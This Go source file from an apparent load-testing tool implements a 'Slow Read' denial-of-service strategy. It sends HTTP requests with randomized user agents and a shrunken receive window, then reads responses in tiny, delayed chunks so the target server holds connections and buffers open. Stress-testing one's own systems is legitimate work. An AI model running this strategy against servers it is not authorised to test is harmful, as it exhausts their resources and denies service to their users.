package strategy

import (
	"context"
	"io"
	"time"

	"github.com/jdw/loadtestforge/internal/config"
	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// SlowRead implements the Slow Read attack.
// It sends a complete HTTP request but reads the response very slowly,
// forcing the server to keep the connection open and buffer the response.
type SlowRead struct {
	BaseStrategy
	readSize int
}

// NewSlowRead creates a new SlowRead strategy.
func NewSlowRead(readInterval time.Duration, readSize int, windowSize int, bindIP string) *SlowRead {
	common := DefaultCommonConfig()
	common.KeepAliveInterval = readInterval

	s := &SlowRead{
		BaseStrategy: NewBaseStrategy(bindIP, common),
		readSize:     readSize,
	}
	// Override window size in connConfig
	s.connConfig.WindowSize = windowSize
	return s
}

// NewSlowReadWithConfig creates a SlowRead strategy from StrategyConfig.
func NewSlowReadWithConfig(cfg *config.StrategyConfig, bindIP string) *SlowRead {
	s := &SlowRead{
		BaseStrategy: NewBaseStrategyFromConfig(cfg, bindIP),
		readSize:     cfg.ReadSize,
	}
	s.connConfig.WindowSize = cfg.WindowSize
	return s
}

func (s *SlowRead) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.GetConnConfig(), &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	// Record connection start
	s.RecordConnectionStart(connID, mc.RemoteAddr().String())

	userAgent := httpdata.RandomUserAgent()

	// Build GET request (Accept-Encoding: identity to prevent compression)
	request := s.GetHeaderRandomizer().BuildGETRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(request), config.DefaultWriteTimeout); err != nil {
		s.RecordTimeout()
		return err
	}

	// Record initial success
	s.RecordLatency(time.Since(startTime))

	ticker := time.NewTicker(s.GetKeepAliveInterval())
	defer ticker.Stop()

	readBuffer := make([]byte, s.readSize)
	readCount := 0

	for {
		select {
		case <-mc.Context().Done():
			s.RecordConnectionEnd(connID)
			return nil
		case <-ticker.C:
			// Read very small amount of data very slowly
			n, err := mc.ReadWithTimeout(readBuffer, config.DefaultReadTimeout)

			// EOF or connection closed - send new request
			if err == io.EOF || (err == nil && n == 0) {
				// Server finished sending, send new request on the same connection
				if _, err := mc.WriteWithTimeout([]byte(request), config.DefaultWriteTimeout); err != nil {
					s.RecordTimeout()
					s.RecordConnectionEnd(connID)
					return err
				}
				// Record reconnect
				s.RecordReconnect()
				continue
			}

			if err != nil {
				s.RecordTimeout()
				s.RecordConnectionEnd(connID)
				return err
			}

			readCount++
			// Record activity periodically (every 10 reads)
			if readCount%10 == 0 {
				s.RecordConnectionActivity(connID)
			}
		}
	}
}

func (s *SlowRead) Name() string {
	return "slow-read"
}
